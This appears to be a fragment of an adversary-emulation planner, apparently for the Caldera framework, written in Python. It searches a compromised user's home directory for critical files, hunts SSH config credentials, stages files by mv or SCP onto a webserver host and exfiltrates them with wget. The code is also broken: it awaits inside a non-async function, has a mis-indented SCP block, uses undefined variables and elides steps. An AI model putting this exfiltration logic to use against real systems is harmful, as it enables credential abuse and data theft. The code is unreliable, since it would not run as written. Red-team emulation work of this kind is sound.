# Ignore type hinting
# type: ignore


def get_low_level_action(self, ability_id):
    all_agent_links = await planning_svc.get_links(operation=operation, agent=agent)
    for link in all_agent_links:
        if link.ability.ability_id == ability_id:
            return link
    return None


# Search for critical data
dir_to_search = f"/home/{self.new_initial_access_host.username}/"
# ...
dir_link = get_low_level_action(self, LS_ABILITY_ID)
link_id = await operation.apply(dir_link)
await operation.wait_for_links_completion([link_id])
ls_facts = await self.knowledge_svc_handle.get_facts(...)
critical_files = []
for fact in ls_facts:
    if isCriticalData(fact.value):
        critical_files.append(fact.value)
if len(critical_files) > 0:
    for critical_file in critical_files:
        # Is agent running a webserver?
        if open_ports[infectedHostAgent.ip] == 80:
            # Stage data to webserver using mv
            # Setup mv facts
            # ...
            stage_link = get_low_level_action(self, MV_FILE_ABILITY_ID)
            link_id = await operation.apply(stage_link)
            await operation.wait_for_links_completion([link_id])
            ## Exfiltrate data directly using wget
            # Setup wget facts
            await self.knowledge_svc_handle.add_facts(...)
            # ...
            exfil_link = get_low_level_action(self, WGET_EXFIL_ABILITY_ID)
            link_id = await operation.apply(exfil_link)
            await operation.wait_for_links_completion([link_id])
        else:
            # Need to use SCP to stage data on an http server
            ## Find agent running webserver and has credentials to this host
            agents = await self.knowledge_svc_handle.get_agents()
            for agent in agents:
                exfiltrated_data = False
                if open_ports[agent.ip] == 80:
                    # Check if it has credentials
                    # ...
                    ## Try to find SSH credentials
                    has_ssh_creds = False
                    ssh_config_link = get_low_level_action(self, SSH_CONFIG_ABILITY_ID)
                    link_id = await operation.apply(ssh_config_link)
                    await operation.wait_for_links_completion([link_id])
                    # Parse results
                    # ...
                    for ssh_config_fact in ssh_config_facts:
                        if ssh_config_fact.value == agent.hostname:
                            has_ssh_creds = True
                            break
                    if has_ssh_creds:
                        # SCP data to webserver
                        # ...
                         ssh_config_link = get_low_level_action(self, SCP_FILE_ABILITY_ID)
                            link_id = await operation.apply(ssh_config_link)
                            await operation.wait_for_links_completion([link_id])
                        # Exfiltrate data
                        # Setup wget facts
                        await self.knowledge_svc_handle.add_facts(...)
                        # ...
                        exfil_link = get_low_level_action(self, WGET_EXFIL_ABILITY_ID)
                        link_id = await operation.apply(exfil_link)
                        await operation.wait_for_links_completion([link_id])
